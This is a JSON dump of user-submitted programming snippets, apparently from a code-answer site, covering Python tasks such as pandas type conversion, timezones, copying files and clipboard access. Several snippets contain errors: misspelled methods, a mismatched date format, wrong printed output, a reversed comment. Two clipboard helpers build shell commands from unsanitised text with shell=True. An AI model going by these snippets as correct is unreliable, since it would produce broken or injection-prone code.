    "description": "time = 72.345. ​ hours = int(time) minutes = (time*60) % 60. seconds = (time*3600) % 60. ​ print(\"%d:\u0002d.\u0002d\" % (hours, minutes, seconds)) >> 72:20:42.\n",
    "reg_date": "2021-10-12T11:28:30.000Z"
  },
  {
    "id": 600,
    "keyword": null,
    "link": null,
    "title": " convert numpy to torch",
    "description": "torch.from_numpy(your_array)\n",
    "reg_date": "2021-10-12T11:28:30.000Z"
  },
  {
    "id": 601,
    "keyword": null,
    "link": null,
    "title": " convert opencv image to pil image",
    "description": "import cv2 import numpy as np from PIL import Image  img = cv2.imread(\"path/to/img.png\")  # You may need to convert the color. img = cv2.cvtColor(img, cv2.COLOR_BGR2RGB) im_pil = Image.fromarray(img)  # For reversing the operation: im_np = np.asarray(im_pil)\n",
    "reg_date": "2021-10-12T11:28:30.000Z"
  },
  {
    "id": 602,
    "keyword": null,
    "link": null,
    "title": " convert pandas column type",
    "description": "# You can use \"astype\" method # suppose you want to correct your \"sales\" column data type df['sales'] = df['sales'].astype('float64')\n>>> df.astype({'col1': 'int32'}).dtypes col1    int32 col2    int64 dtype: object\n# convert all columns of DataFrame df = df.apply(pd.to_numeric) # convert all columns of DataFrame  # convert just columns \"a\" and \"b\" df[[\"a\", \"b\"]] = df[[\"a\", \"b\"]].apply(pd.to_numeric) \n# convert Series my_series = pd.to_numeric(my_series)  # convert column \"a\" of a DataFrame df[\"a\"] = pd.to_numeric(df[\"a\"]) \ndf = pd.read_csv(\"weather.tsv\", sep=\"\\t\",                    dtype={'Day': str,'Wind':int64}) df.dtypes \n",
    "reg_date": "2021-10-12T11:28:30.000Z"
  },
  {
    "id": 603,
    "keyword": null,
    "link": null,
    "title": " convert pandas dataframe/ table to python dictionary",
    "description": "import pandas as pd data = {'col_1': [3, 2, 1, 0], 'col_2': ['a', 'b', 'c', 'd']} pd.DataFrame.from_dict(data, orient='index').T\ndf.to_dict(orient='index')\n>>> data = {'col_1': [3, 2, 1, 0], 'col_2': ['a', 'b', 'c', 'd']} >>> pd.DataFrame.from_dict(data)    col_1 col_2 0      3     a 1      2     b 2      1     c 3      0     d \n#Lazy way to convert json dict to df  pd.DataFrame.from_dict(data, orient='index').T\n>>> df.to_dict('records') [{'col1': 1, 'col2': 0.5}, {'col1': 2, 'col2': 0.75}] \n",
    "reg_date": "2021-10-12T11:28:30.000Z"
  },
  {
    "id": 604,
    "keyword": null,
    "link": null,
    "title": " convert pandas dataframe to spark dataframe",
    "description": "import pandas as pd from pyspark.sql import SparkSession  filename = <'path to file'> spark = SparkSession.build.appName('pandasToSpark').getOrCreate() # Assuming file is csv pandas_df = pd.read_csv(filename) spark_df = spark.CreateDataFrame(pandas_df)\npandas_df = some_df.toPandas()\n",
    "reg_date": "2021-10-12T11:28:30.000Z"
  },
  {
    "id": 605,
    "keyword": null,
    "link": null,
    "title": " convert pandas datetime to day, weekday, month",
    "description": "#Convert datetime column/series to hour of the day. NB: Column must be in datetime format. df['hour'] = df['column_name'].dt.hour #Convert datetime column/series to day of the week df['day'] = df['column_name'].dt.weekday #Convert datetime column/series to month df['month'] = df['column_name'].dt.month #Convert datetime column/series to year df['year'] = df['column_name'].dt.year #NB: Weekday/Month will be in int. Eg. for months, January=1, February=2...etc,\n",
    "reg_date": "2021-10-12T11:28:30.000Z"
  },
  {
    "id": 606,
    "keyword": null,
    "link": null,
    "title": " convert pdf to base64 python",
    "description": "# credit to the Stack Overflow user in the source link  import base64  with open(\"book.pdf\", \"rb\") as pdf_file:     encoded_string = base64.b64encode(pdf_file.read())\n",
    "reg_date": "2021-10-12T11:28:31.000Z"
  },
  {
    "id": 607,
    "keyword": null,
    "link": null,
    "title": " convert period to timestamp pandas",
    "description": "period = pd.Period('2017-1') period.to_timestamp()\n",
    "reg_date": "2021-10-12T11:28:31.000Z"
  },
  {
    "id": 608,
    "keyword": null,
    "link": null,
    "title": " convert python list to text file",
    "description": "# define list of places places = ['Berlin', 'Cape Town', 'Sydney', 'Moscow']  with open('listfile.txt', 'w') as filehandle:     for listitem in places:         filehandle.write('%s\\n' % listitem)\nimport json a = [1,2,3] with open('test.txt', 'w') as f:     f.write(json.dumps(a))  #Now read the file back into a Python list object with open('test.txt', 'r') as f:     a = json.loads(f.read())\n# define list of places places = ['Berlin', 'Cape Town', 'Sydney', 'Moscow']  with open('listfile.txt', 'w') as filehandle:     for listitem in places:         filehandle.write('%s\\n' % listitem) \n",
    "reg_date": "2021-10-12T11:28:31.000Z"
  },
  {
    "id": 609,
    "keyword": null,
    "link": null,
    "title": " convert python pandas series dtype to datetime",
    "description": "# Converting a column in a pandas DataFrame to datetime # NB: This can also be applied to pandas series pd.to_datetime(df['column_name'])\n",
    "reg_date": "2021-10-12T11:28:31.000Z"
  },
  {
    "id": 610,
    "keyword": null,
    "link": null,
    "title": " convert response to json python",
    "description": "import json import requests  response = requests.get(...) json_data = json.loads(response.text)\n#You can use json.loads:  import json import requests  response = requests.get(...) json_data = json.loads(response.text)\n",
    "reg_date": "2021-10-12T11:28:31.000Z"
  },
  {
    "id": 611,
    "keyword": null,
    "link": null,
    "title": " convert string array to integer python",
    "description": "desired_array = [int(numeric_string) for numeric_string in current_array]\n",
    "reg_date": "2021-10-12T11:28:31.000Z"
  },
  {
    "id": 612,
    "keyword": null,
    "link": null,
    "title": " convert string to date django",
    "description": "from django.utils.dateparse import parse_date, parse_datetime  # For only Date date_str = \"2021-04-07\" date = parse_date(date_str) # For DateTime datetime_str = \"2021-09-10T18:40:54\" date = parse_date(datetime_str)  OR  date_str = \"2021-04-07\" datetime.datetime.strptime(date_str, \"%Y-%m-%d\").date() \n",
    "reg_date": "2021-10-12T11:28:31.000Z"
  },
  {
    "id": 613,
    "keyword": null,
    "link": null,
    "title": " convert string to utf8 python",
    "description": "FORMAT = 'utf8'  text = 'Hello World!' # text to encode to FORMAT encoded_text = text.encode(FORMAT)  # the variable [text] is now encoded and is stored inside [encoded_text].\nAcci&oacute;n\n",
    "reg_date": "2021-10-12T11:28:31.000Z"
  },
  {
    "id": 614,
    "keyword": null,
    "link": null,
    "title": " convert tibble to dataframe",
    "description": "as.data.frame(x) #x being the tibble to be converted\n",
    "reg_date": "2021-10-12T11:28:31.000Z"
  },
  {
    "id": 615,
    "keyword": null,
    "link": null,
    "title": " convert time zone pandas",
    "description": "# convert timezone from UTC to GMT+7 df['timestamp'].map(lambda x: pd.to_datetime(x, yearfirst=True).tz_convert('Asia/Bangkok'))\n",
    "reg_date": "2021-10-12T11:28:31.000Z"
  },
  {
    "id": 616,
    "keyword": null,
    "link": null,
    "title": " convert timezone python",
    "description": "from datetime import datetime from pytz import timezone, all_timezones # must read else Bug: # https://blog.ganssle.io/articles/2018/03/pytz-fastest-footgun.html  # aware dt-obj dt_obj = datetime.strptime('2021-05-19T01:55:10+0000', '%Y-%m-%dT%H:%M:%S%z') # double confirmaiton: aware dt-obj dt_obj.tzinfo # correct dt_obj.astimezone(timezone('US/Pacific')) # correct dt_obj.replace(tzinfo=timezone('UTC')).astimezone(timezone('US/Pacific')) # confirmation: desired tz dt_obj.replace(tzinfo=timezone('UTC')).astimezone(timezone('US/Pacific')).tzinfo # ~~~~~~~ # naive datetime object datetime.utcnow() # confirmation: naive dt-obj print(datetime.utcnow().tzinfo) # incorrect because started with naive datetime object datetime.utcnow().astimezone(timezone('US/Pacific')) # correct because add/replace tzinfo of initial dt-obj before conversion to desired tz # SEE article link above. The following is probably correct only bc starting w/ utc. datetime.utcnow().replace(tzinfo=timezone('UTC')).astimezone(timezone('US/Pacific')) # confirmation: aware dt-obj datetime.utcnow().replace(tzinfo=timezone('UTC')).astimezone(timezone('US/Pacific')).tzinfo  from dateutil import tz dt=datetime(2018, 11, 1,20,0,0)  print(dt) # 2018-11-01 20:00:00 print(dt.replace(tzinfo=tz.gettz('UTC')).astimezone(tz.gettz('US/Eastern'))) # 2018-11-01 16:00:00-04:00 print(datetime(2018, 11, 1,20,0,0,tzinfo=tz.gettz('UTC')).astimezone(tz.gettz('US/Eastern'))) # 2018-11-01 16:00:00-04:00 print(dt.replace(tzinfo=timezone('UTC')).astimezone(timezone('US/Eastern'))) # 2018-11-01 16:00:00-04:00 print(datetime(2018, 11, 1,20,0,0,tzinfo=timezone('UTC')).astimezone(timezone('US/Eastern'))) # 2018-11-01 16:00:00-04:00 print(timezone('UTC').localize(dt).astimezone(timezone('US/Eastern'))) # 2018-11-01 16:00:00-04:00  # ~~ VS ~~ dt=datetime(2018, 11, 1,16,0,0) print(dt) # 2018-11-01 16:00:00 print(dt.replace(tzinfo=tz.gettz('US/Eastern')).astimezone(tz.gettz('US/Pacific'))) # 2018-11-01 13:00:00-07:00 print(datetime(2018, 11, 1,16,0,0,tzinfo=tz.gettz('US/Eastern')).astimezone(tz.gettz('US/Pacific'))) # 2018-11-01 13:00:00-07:00 print(dt.replace(tzinfo=timezone('US/Eastern')).astimezone(timezone('US/Pacific'))) # Bug vector # 2018-11-01 13:56:00-07:00 # incorrect! print(datetime(2018, 11, 1,16,0,0,tzinfo=timezone('US/Eastern')).astimezone(timezone('US/Pacific'))) # Bug vector # 2018-11-01 13:56:00-07:00 # incorrect! print(timezone('US/Eastern').localize(dt).astimezone(timezone('US/Pacific'))) # 2018-11-01 13:00:00-07:00  # ~~~~~~~~~~~ # len(all_timezones) == 593 for zone in all_timezones:     print(zone)\nimport pytz from dateutil import tz from datetime import datetime, timedelta # must read source link else Bug:  NYC_p = pytz.timezone('America/New_York')   # 1.53 &micro;s NYC_d = tz.gettz('America/New_York')        # 863 ns # tz Awareness dt_p = NYC_p.localize(datetime(2018, 11, 1))    # 35.4 &micro;s dt_d = datetime(2018, 11, 1, tzinfo=NYC_d)      # 1.38 &micro;s  dt_p.utcoffset()        # 655 ns dt_d.utcoffset()        # 13.9 &micro;s  LA_p = pytz.timezone('America/Los_Angeles') LA_d = tz.gettz('America/Los_Angeles') # tz Conversion NYC_p.localize(datetime(2018, 11, 1)).astimezone(LA_p)  # 44.8 &micro;s datetime(2018, 11, 1, tzinfo=NYC_d).astimzone(LA_d)     # 32.8 &micro;s  # ~~~~~ Date Arithmetic dt_winter = datetime(2018, 2, 14, 12, tzinfo=NYC_d) dt_spring = dt_winter + timedelta(days=60) print(dt_spring) # 2018-04-15 12:00:00-04:00 # correct  dt_winter = NYC_p.localize(datetime(2018, 2, 14, 12)) # potential Bug vector1 dt_spring = dt_winter + timedelta(days=60) print(dt_spring) # 2018-04-15 12:00:00-05:00 # incorrect. subtle gotcha! print(NYC_p.normalize(dt_spring)) # potential Bug vector2 # 2018-04-15 13:00:00-04:00 # correct\n",
    "reg_date": "2021-10-12T11:28:32.000Z"
  },
  {
    "id": 617,
    "keyword": null,
    "link": null,
    "title": " convert to timestamp python",
    "description": "import datetime date = '18/05/2020 - 18:05:12'  # convert string to datetimeformat date = datetime.datetime.strptime(date, \"%d %m %Y - %H:%M:%S\"\")  # convert datetime to timestamp date = datetime.datetime.timestamp(date)\nimport datetime date = '18/05/2020 - 18:05:12'  # convert string to datetimeformat date = datetime.datetime.strptime(date, \"%d %m %Y - %H:%M:%S\")  # convert datetime to timestamp date = datetime.datetime.timestamp(date)\nfrom datetime import datetime  timestamp = 1545730073 dt_object = datetime.fromtimestamp(timestamp)  print(\"dt_object =\", dt_object) print(\"type(dt_object) =\", type(dt_object))\nimport time import datetime s = \"01/12/2011\" time.mktime(datetime.datetime.strptime(s, \"%d/%m/%Y\").timetuple())\n",
    "reg_date": "2021-10-12T11:28:32.000Z"
  },
  {
    "id": 618,
    "keyword": null,
    "link": null,
    "title": " convert ui to py",
    "description": "pyuic5 -x {your ui file.ui} -o {output py file.py}\npyuic5 -x -o pyfilename.py design.ui\n python -m PyQt5.uic.pyuic youruifile -o yourpyfile -x\npyuic5 -x {your ui file} -o {output file}\n# To convert .ui file into .py file using pyside2 >> pyside2-uic main.ui -o main.py\n#The shortest? pyuic5 -xo pyfilename.py design.ui\n",
    "reg_date": "2021-10-12T11:28:32.000Z"
  },
  {
    "id": 619,
    "keyword": null,
    "link": null,
    "title": " converting a csv into python list",
    "description": "import csv with open('records.csv', 'r') as f:   file = csv.reader(f)   my_list = list(file) print(my_list)\n",
    "reg_date": "2021-10-12T11:28:32.000Z"
  },
  {
    "id": 620,
    "keyword": null,
    "link": null,
    "title": " converting bool to 1 if it has true and if it is false print 1",
    "description": "bool = True if bool == True:     print(1) else:     print(0) print()\n",
    "reg_date": "2021-10-12T11:28:32.000Z"
  },
  {
    "id": 621,
    "keyword": null,
    "link": null,
    "title": " converting capital letters to lowercase  and viceversa in python",
    "description": "s=input() new_str=\"\" for i in range (len(s)):     if s[i].isupper():         new_str+=s[i].lower()     elif s[i].islower():         new_str+=s[i].upper()     else:         new_str+=s[i] print(new_str)                  \n",
    "reg_date": "2021-10-12T11:28:32.000Z"
  },
  {
    "id": 622,
    "keyword": null,
    "link": null,
    "title": " converting column data to sha256 pandas",
    "description": "import hashlib string=\"pythonpool.com\" encoded=string.encode() result = hashlib.sha256(encoded) print(result.hexdigest())\n",
    "reg_date": "2021-10-12T11:28:32.000Z"
  },
  {
    "id": 623,
    "keyword": null,
    "link": null,
    "title": " converting month number to month name python",
    "description": "import datetime date = '2021-05-21 11:22:03' datem = datetime.datetime.strptime(date, \"%Y-%m-%d %H:%M:%S\") print(datem.day)        # 25 print(datem.month)      # 5 print(datem.year)       # 2021 print(datem.hour)       # 11 print(datem.minute)     # 22 print(datem.second)     # 3\nmonths_in_year = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'] date = '2021-11-21 11:22:03' month = date.dt.month print(month) #Output 11  month_name = months_in_year [month - 1] print(month_name) #Output November\n",
    "reg_date": "2021-10-12T11:28:32.000Z"
  },
  {
    "id": 624,
    "keyword": null,
    "link": null,
    "title": " cool advances python ptoject ideas",
    "description": "make a game of file sorter\n",
    "reg_date": "2021-10-12T11:28:32.000Z"
  },
  {
    "id": 625,
    "keyword": null,
    "link": null,
    "title": " copy file in python3",
    "description": "import shutil  original = r'original path where the file is currently stored\\file name.file extension' target = r'target path where the file will be copied\\file name.file extension'  shutil.copyfile(original, target) \n",
    "reg_date": "2021-10-12T11:28:32.000Z"
  },
  {
    "id": 626,
    "keyword": null,
    "link": null,
    "title": " copy files python",
    "description": "from shutil import copyfile copyfile(src, dst)\nimport shutil  original = r'original path where the file is currently stored\\file name.file extension' target = r'target path where the file will be copied\\file name.file extension'  shutil.copyfile(original, target) \nfrom shutil import copyfile copyfile(src, dst) \n",
    "reg_date": "2021-10-12T11:28:33.000Z"
  },
  {
    "id": 627,
    "keyword": null,
    "link": null,
    "title": " copy image from one folder to another in python",
    "description": "import glob import shutil import os  src_dir = \"your/source/dir\" dst_dir = \"your/destination/dir\" for jpgfile in glob.iglob(os.path.join(src_dir, \"*.jpg\")):     shutil.copy(jpgfile, dst_dir) \nimport shutil import os  os.chdir('source_image_dir_path') dst_dir = \"your_destination_dir_path\" for f in os.listdir():     shutil.copy(f, dst_dir)\n",
    "reg_date": "2021-10-12T11:28:33.000Z"
  },
  {
    "id": 628,
    "keyword": null,
    "link": null,
    "title": " copy string python",
    "description": "# The pyperclip module is used to copy text to the clipboard in python. # To install it, run pip install pyperclip in your terminal. import pyperclip var = 'Hello World' pyperclip.copy(var)\na = 'foo' b = 'bar' print(2*a) foofoo print(a+a) foofoo r = b print(r) bar\n",
    "reg_date": "2021-10-12T11:28:33.000Z"
  },
  {
    "id": 629,
    "keyword": null,
    "link": null,
    "title": " copy text to clipboard python",
    "description": "import pyperclip pyperclip.copy('The text to be copied to the clipboard.')\n# To use native Python directories, use: from subprocess import check_call  # On windows use: def copy2clip(txt):     cmd='echo '+txt.strip()+'|clip'     return check_call(cmd, shell=True)  # On Mac use: def copy2clip(txt):     cmd='echo '+txt.strip()+'|pbcopy'     return check_call(cmd, shell=True)  # Then to call the function use: copy2clip('This is on my clipboard!')\n",
    "reg_date": "2021-10-12T11:28:33.000Z"
  },
  {
    "id": 630,
    "keyword": null,
    "link": null,
    "title": " copy to clipboard python",
    "description": "import pyperclip pyperclip.copy('The text to be copied to the clipboard.')\nimport clipboard clipboard.copy(\"abc\")  # now the clipboard content will be string \"abc\" text = clipboard.paste()  # text will have the content of clipboard \n# To use native Python directories, use: from subprocess import check_call  # On windows use: def copy2clip(txt):     cmd='echo '+txt.strip()+'|clip'     return check_call(cmd, shell=True)  # On Mac use: def copy2clip(txt):     cmd='echo '+txt.strip()+'|pbcopy'     return check_call(cmd, shell=True)  # Then to call the function use: copy2clip('This is on my clipboard!')\nimport clr import System from System.Threading import Thread, ThreadStart clr.AddReference(\"System.Windows.Forms\")  def SetText(text):     def thread_proc():         System.Windows.Forms.Clipboard.SetText(text)     t = Thread(ThreadStart(thread_proc))     t.ApartmentState = System.Threading.ApartmentState.STA     t.Start() SetText(\"Hello word\")\n",
    "reg_date": "2021-10-12T11:28:33.000Z"
  },
  {
    "id": 631,
    "keyword": null,
    "link": null,
    "title": " copy whole directory python",
    "description": "import shutil  shutil.copytree(source, destination)\nfrom shutil import copytree shutil.copytree(\"sourcedir\", \"destination\")\n",
    "reg_date": "2021-10-12T11:28:33.000Z"
  },
  {
    "id": 632,
    "keyword": null,
    "link": null,
    "title": " coronavirus tips",
    "description": "# STAY home. # KEEP 6 feet away. # WASH your hands. # COVER your mouth. # SICK? Call 811.\nGo to the WHO's website for info about COVID-19.\nPlease make sure to initiate social distancing and wash your hands after any outer contact, human contact or surface contact. Sanitize often and especially after touching your face to prevent the spread. Some symtoms may include: Sore Throat Coughing Head Ache Shortness of Breath -And the most important to look for- Fever If you feel any of these symtoms self isolate for some time to see if they prevail. If the symtoms don't go away it is recommended that you call a hospital and see if you can get yourself checked for COVID-19  Stay safe, and wash your hands!\n do the five in helping stop cornonavirus  \n",
    "reg_date": "2021-10-12T11:28:33.000Z"
  },
  {
    "id": 633,
    "keyword": null,
    "link": null,
    "title": " correlation matrix python",
    "description": "import seaborn as sns df = sns.load_dataset('iris') corr_matrix = df.corr() corr_matrix.style.background_gradient(cmap='coolwarm') # 'RdBu_r', 'BrBG_r', & PuOr_r are other good diverging colormaps \nimport numpy as np import scipy.stats x = np.arange(15, 20) y = np.arange(5, 10) stat, p = scipy.stats.pearsonr(x, y) \ndf.corr()\n",
    "reg_date": "2021-10-12T11:28:33.000Z"
  },
  {
    "id": 634,
    "keyword": null,
    "link": null,
    "title": " cors error in flask",
    "description": "from flask import Flask from flask_cors import CORS, cross_origin  app = Flask(__name__) CORS(app)  @app.route(\"/\") def helloWorld():     return \"Hello world\"\n",
    "reg_date": "2021-10-12T11:28:33.000Z"
  },
  {
    "id": 635,
    "keyword": null,
    "link": null,
    "title": " cos in python in degrees",
    "description": "math.cos(math.radians(1)) # math.cos takes radians # math.radians converts radians to degrees\n",
    "reg_date": "2021-10-12T11:28:33.000Z"
  },
  {
    "id": 636,
    "keyword": null,
    "link": null,
    "title": " cosine interpolation",
    "description": "def cosineInterpolate(y1, y2, x) {    xv = (1 - cos(x * 3.1415927)) / 2    return y1 + (y2 - y1) * xv } \ndef linearInterpolate(y1, y2, x):   return y1 + (y2 - y1) * x   \ndef cosineInterpolate(y1, y2, x):    xv = (1 - cos(x * 3.1415927)) / 2    return y1 + (y2 - y1) * xv\n",
    "reg_date": "2021-10-12T11:28:34.000Z"
  },
  {
    "id": 637,
    "keyword": null,
    "link": null,
    "title": " cosine similarity python numpy",
    "description": "from scipy import spatial  dataSetI = [3, 45, 7, 2] dataSetII = [2, 54, 13, 15] result = 1 - spatial.distance.cosine(dataSetI, dataSetII)\n",
    "reg_date": "2021-10-12T11:28:34.000Z"
  },
  {
    "id": 638,
    "keyword": null,
    "link": null,
    "title": " count gabarit django",
    "description": "#in template you can use the filter length on your model post {{ posts|length }} \n#views.py #You should instead pass places_count via the context to the template: def places(request):     places = Places.objects.order_by('-published_date')[:10]     places_count = Places.objects.count()     return render(         request, 'templates/places.html', {'places':places, 'places_count': places_count}     ) #in your templatee <div class=\"container\">     <h2>Places <span class=\"badge\">{{ places_count }}</span></h2> </div>\n",
    "reg_date": "2021-10-12T11:28:34.000Z"
  },
  {
    "id": 639,
    "keyword": null,
    "link": null,
    "title": " count how many duplicates python pandas",
    "description": "df.duplicated(subset='one', keep='first').sum() \n",
    "reg_date": "2021-10-12T11:28:34.000Z"
  },
  {
    "id": 640,
    "keyword": null,
    "link": null,
    "title": " count how many times a value shows in python list",
    "description": "#use count(): >>> my_list = [1, 2, 3, 1, 4] >>> print(my_list.count(1)) 2  #OR, you can also use counter: >>> from collections import Counter >>> z = ['blue', 'red', 'blue', 'yellow', 'blue', 'red'] >>> Counter(z) Counter({'blue': 3, 'red': 2, 'yellow': 1})\n",
    "reg_date": "2021-10-12T11:28:34.000Z"
  },
  {
    "id": 641,
    "keyword": null,
    "link": null,
    "title": " count how many vowels in a string python",
    "description": "def vowel_count(string):   vowels = ['a', 'e', 'i', 'o', 'u']   return len([i for i in string if i in vowels])\nvow = ['a', 'A', 'e',           'E', 'i', 'I',           'o', 'O', 'U',           'u', 'Y', 'y']  def vowels(str):      global vow   string = list(str)   count = 0      for i in range(len(string)):          if string[i] in vow:              count += 1   return count \n",
    "reg_date": "2021-10-12T11:28:34.000Z"
  },
  {
    "id": 642,
    "keyword": null,
    "link": null,
    "title": " count line of code in python recursive",
    "description": "find . -name '*.py' | xargs wc -l | sort -nr\n",
    "reg_date": "2021-10-12T11:28:34.000Z"
  },
  {
    "id": 643,
    "keyword": null,
    "link": null,
    "title": " count missing values by column in pandas",
    "description": "df.isna().sum()\ndfObj.isnull().sum().sum() \ncols_to_delete = df.columns[df.isnull().sum()/len(df) > .90] df.drop(cols_to_delete, axis = 1, inplace = True)\n",
    "reg_date": "2021-10-12T11:28:34.000Z"
  },
  {
    "id": 644,
    "keyword": null,
    "link": null,
    "title": " count missing values groupby",
    "description": "CLASS FEATURE1 FEATURE2 FEATURE3   X      A       NaN      NaN   X     NaN       A       NaN   B      A        A        A     df.drop('CLASS', 1).isna().groupby(df.CLASS, sort=False).sum().reset_index()    CLASS  FEATURE1  FEATURE2  FEATURE3 0     X       1.0       1.0       2.0 1     B       0.0       0.0       0.0\n",
    "reg_date": "2021-10-12T11:28:34.000Z"
  },
  {
    "id": 645,
    "keyword": null,
    "link": null,
    "title": " count nan in csv file python",
    "description": "# total NaN values in column 'B' print(data['B'].isnull().sum())\n",
    "reg_date": "2021-10-12T11:28:34.000Z"
  },
  {
    "id": 646,
    "keyword": null,
    "link": null,
    "title": " count nan pandas",
    "description": "df[df.isnull().any(axis=1)]\n#Python, pandas #Count missing values for each column of the dataframe df  df.isnull().sum() \n# position of NaN values in terms of index df.loc[pandas.isna(df[\"b\"]), :].index  # position of NaN values in terms of rows that cotnain NaN df.loc[pandas.isna(df[\"b\"]), :]\ndf.isnull().values.any() \n# Count total missing values in a dataframe  df.isnull().sum().sum()  # Gives a integer value\nIn [5]: df = pd.DataFrame({'a':[1,2,np.nan], 'b':[np.nan,1,np.nan]})  In [6]: df.isna().sum() Out[6]: a    1 b    2 dtype: int64\n",
    "reg_date": "2021-10-12T11:28:35.000Z"
  },
  {
    "id": 647,
    "keyword": null,
    "link": null,
    "title": " count similar values in list python",
    "description": "MyList = [\"a\", \"b\", \"a\", \"c\", \"c\", \"a\", \"c\"]  return my_dict = {i:MyList.count(i) for i in MyList} # returns : {'a': 3, 'c': 3, 'b': 1}  # OR from collections import Counter return my_dict = dict(Counter(MyList)) # returns :    {'a': 3, 'c': 3, 'b': 1} # the both returns the same so it's up to you to choose the one you prefere ;)\n>>> l = [\"a\",\"b\",\"b\"] >>> l.count(\"a\")\n",
    "reg_date": "2021-10-12T11:28:35.000Z"
  },
  {
    "id": 648,
    "keyword": null,
    "link": null,
    "title": " count the duplicates in a list in python",
    "description": "some_list=['a','b','c','b','d','m','n','n']   my_list=sorted(some_list)   duplicates=[] for i in my_list:      if my_list.count(i)>1:          if i not in duplicates:              duplicates.append(i)   print(duplicates)\n",
    "reg_date": "2021-10-12T11:28:35.000Z"
  },
  {
    "id": 649,
    "keyword": null,
    "link": null,
    "title": " count the frequency of words in a file",
    "description": "from collections import Counter def word_count(fname):         with open(fname) as f:                 return Counter(f.read().split())  print(\"Number of words in the file :\",word_count(\"test.txt\"))\n",
    "reg_date": "2021-10-12T11:28:35.000Z"
  },
  {
    "id": 650,
    "keyword": null,
    "link": null,
    "title": " count unique values numpy",
    "description": "import numpy as np  x = np.array([1,1,1,2,2,2,5,25,1,1]) unique, counts = np.unique(x, return_counts=True)  print np.asarray((unique, counts)).T\nnumber_list = numpy.array([1, 1, 2, 3, 4, 4, 1]) (unique, counts) = numpy.unique(number_list, return_counts=True)\n>>> a = np.array(['a', 'b', 'b', 'c', 'a']) >>> u, indices = np.unique(a, return_index=True) >>> u array(['a', 'b', 'c'], dtype='<U1') >>> indices array([0, 1, 3]) >>> a[indices] array(['a', 'b', 'c'], dtype='<U1') \n",
    "reg_date": "2021-10-12T11:28:35.000Z"
  },
  {
    "id": 651,
    "keyword": null,
    "link": null,
    "title": " count values pandas",
    "description": ">>> index = pd.Index([3, 1, 2, 3, 4, np.nan]) >>> index.value_counts() 3.0    2 4.0    1 2.0    1 1.0    1 dtype: int64 \ncol-name.value_count()\ndf = pd.DataFrame({'a':list('abssbab')}) df.groupby('a').count()\ndf.value_counts(normalize=True) \n",
    "reg_date": "2021-10-12T11:28:35.000Z"
  },
  {
    "id": 652,
    "keyword": null,
    "link": null,
    "title": " covariance matrix python",
    "description": "import numpy as np  A = [45,37,42,35,39] B = [38,31,26,28,33] C = [10,15,17,21,12]  data = np.array([A,B,C])  covMatrix = np.cov(data,bias=True) print (covMatrix)\n",
    "reg_date": "2021-10-12T11:28:35.000Z"
  },
  {
    "id": 653,
    "keyword": null,
    "link": null,
    "title": " cowsay library python",
    "description": "# pip install cowsay import cowsay # CowSay Char # ['beavis', 'cheese', 'daemon', 'cow', 'dragon', 'ghostbusters', 'kitty', 'meow', 'milk', 'pig', 'stegosaurus', 'stimpy', 'trex', 'turkey', 'turtle', 'tux']  cowsay.beavis(\"Hello World!\")  cowsay.cheese(\"Hello World!\")  cowsay.daemon(\"Hello World!\")  cowsay.cow(\"Hello World!\")  cowsay.dragon(\"Hello World!\")  cowsay.ghostbusters(\"Hello World!\")  cowsay.kitty(\"Hello World!\")  cowsay.meow(\"Hello World!\")  cowsay.milk(\"Hello World!\")  cowsay.pig(\"Hello World!\")  cowsay.stegosaurus(\"Hello World!\")  cowsay.stimpy(\"Hello World!\")  cowsay.trex(\"Hello World!\")  cowsay.turkey(\"Hello World!\")  cowsay.turtle(\"Hello World!\")  cowsay.tux(\"Hello World!\")\n>>> cowsay.char_names ['beavis', 'cheese', 'daemon', 'cow', 'dragon', 'ghostbusters', 'kitty', 'meow', 'milk', 'pig', 'stegosaurus', 'stimpy', 'turkey', 'turtle', 'tux']  >>> cowsay.chars[0] <function beavis at 0x0000000002D2F908>  >>> len(cowsay.chars) 15 \n",
    "reg_date": "2021-10-12T11:28:35.000Z"
  },
  {
    "id": 654,
    "keyword": null,
    "link": null,
    "title": " créer des variable dynamiques python",
    "description": "for i in range(0, 9):     globals()[f\"my_variable{i}\"] = f\"Hello from variable number {i}!\"   print(my_variable3) # Hello from variable number 3!\n",
    "reg_date": "2021-10-12T11:28:35.000Z"
  },
  {
    "id": 655,
    "keyword": null,
    "link": null,
    "title": " create 2d list dictionary",
    "description": "d = {} for elem in l:     if elem[1] in d:         d[elem[1]].append(elem[0])     else:         d[elem[1]] = [elem[0]] \n",
    "reg_date": "2021-10-12T11:28:35.000Z"
  },
  {
    "id": 656,
    "keyword": null,
    "link": null,
    "title": " create a directory python",
    "description": "# This requires Python&rsquo;s OS module import os  # 'mkdir' creates a directory in current directory. os.mkdir('tempDir')  # can also be used with a path, if the other folders exist. os.mkdir('tempDir2/temp2/temp')  # 'makedirs' creates a directory with it's path, if applicable. os.makedirs('tempDir2/temp2/temp') \n#creates a directory without throwing an error import os def create_dir(dir):   if not os.path.exists(dir):     os.makedirs(dir)     print(\"Created Directory : \", dir)   else:     print(\"Directory already existed : \", dir)   return dir \nimport os  # define the name of the directory to be created path = \"/tmp/year\"  try:     os.mkdir(path) except OSError:     print (\"Creation of the directory %s failed\" % path) else:     print (\"Successfully created the directory %s \" % path) \nnewpath = r'C:\\Program Files\\arbitrary'  if not os.path.exists(newpath):     os.makedirs(newpath)\nimport os directory = \"Krishna\" path_dir = \"C:/Users/../Desktop/current_dir/\" if not os.path.exists(directory): \tos.mkdir(os.path.join(path_dir, directory))\nfrom pathlib import Path  basepath = Path('my_directory/') files_in_basepath = basepath.iterdir() for item in files_in_basepath:     if item.is_file():         print(item.name) \n",
    "reg_date": "2021-10-12T11:28:36.000Z"
  },
  {
    "id": 657,
    "keyword": null,
    "link": null,
    "title": " create a named tuple python",
    "description": ">>> from collections import namedtuple >>> Person = namedtuple('Person', 'first_name last_name zip_code') >>> p1 = Person('Joe', 'Schmoe', '93002') >>> p1.first_name 'Joe' >>> p1[0] 'Joe' >>> p1.zip_code '92002' >>> len(p1) 3 >>> type(p1) <class '__main__.Person'> >>>\n",
    "reg_date": "2021-10-12T11:28:36.000Z"
  },
  {
    "id": 658,
    "keyword": null,
    "link": null,
    "title": " create a relu function in python",
    "description": "# Method 1 def ReLU(x):   return max(x,0)  # Method 2 by a lambda function lambda x:max(x,0)\n",
    "reg_date": "2021-10-12T11:28:36.000Z"
  },
  {
    "id": 659,
    "keyword": null,
    "link": null,
    "title": " create a response object in python",
